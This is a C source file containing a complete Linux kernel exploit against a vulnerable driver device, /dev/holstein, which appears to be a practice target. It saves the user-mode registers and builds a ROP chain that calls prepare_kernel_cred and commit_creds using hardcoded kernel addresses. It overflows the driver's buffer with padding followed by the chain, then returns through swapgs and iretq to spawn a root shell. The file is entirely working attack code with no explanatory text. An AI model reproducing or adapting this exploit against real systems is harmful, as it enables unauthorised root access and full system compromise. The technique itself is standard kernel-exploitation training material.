#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++

typedef uint64_t u64;

u64 dev_fd;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss;
u64 rop[100];

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushfq;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (u64)&win;

    puts("[*] saved state");
}

void prepare_rop_chain()
{
    u64 prepare_kernel_cred = 0xffffffff8106e240;
    u64 commit_creds = 0xffffffff8106e390;
    u64 pop_rdi = 0xffffffff812ef4c0; // find by hand?
    u64 mov_rdi_rax = 0xffffffff8160c96b; // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    u64 pop_rcx = 0xffffffff812ea083; // find by hand?
    u64 swapgs = 0xffffffff8160bfac; // swapgs; ret;
    u64 iretq = 0xffffffff810202af; // objdump -S -M intel vmlinux | grep iretq
    u64 idx = 0;

    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx;
    rop[inc] = 0;
    rop[inc] = mov_rdi_rax;
    rop[inc] = commit_creds;
    rop[inc] = swapgs;
    rop[inc] = iretq;
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;
    
    printf("[*] rop chain prepared, length: %lu\n", idx);
}

void overflow()
{
    // prepare payload
    u64 payload[200];
    u64 rip_offset = 0x408/8;
    for_x(i, 0, rip_offset - 1) payload[i] = 0x4141414141414141;
    for_x(i, 0, 13) payload[rip_offset + i] = rop[i];

    // bof
    u64 len = 0x408 + 8 * 14;
    write(dev_fd, (char *)&payload, len);

    puts("[!] should never be reached");
}

int main()
{
    signal(SIGSEGV, win);

    save_state();
    
    dev_fd = open("/dev/holstein", 2);
    if(dev_fd < 1) puts("[!] fail fd");

    prepare_rop_chain();
    overflow();

    puts("[!] should never be reached");
}